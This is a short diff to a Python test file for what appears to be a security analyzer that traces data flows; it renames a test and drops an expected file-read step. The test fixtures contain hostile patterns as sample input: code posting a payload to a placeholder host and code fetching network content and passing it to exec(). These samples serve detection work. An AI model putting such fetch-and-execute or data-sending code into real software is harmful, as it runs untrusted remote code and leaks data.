@@ -147,7 +147,7 @@ requests.post("https://example.invalid", data=payload)
     ]
 
 
-def test_nested_network_read_preserves_remote_provenance():
+def test_nested_network_response_read_preserves_remote_provenance():
     result = analyze(
         """
 from urllib.request import urlopen
@@ -159,7 +159,6 @@ exec(payload)
     assert flow[0].evidence_kind == "dataflow"
     assert event_operations(result, flow[0]) == [
         "NETWORK_RECEIVE",
-        "FILE_READ",
         "DYNAMIC_EXEC",
     ]
 
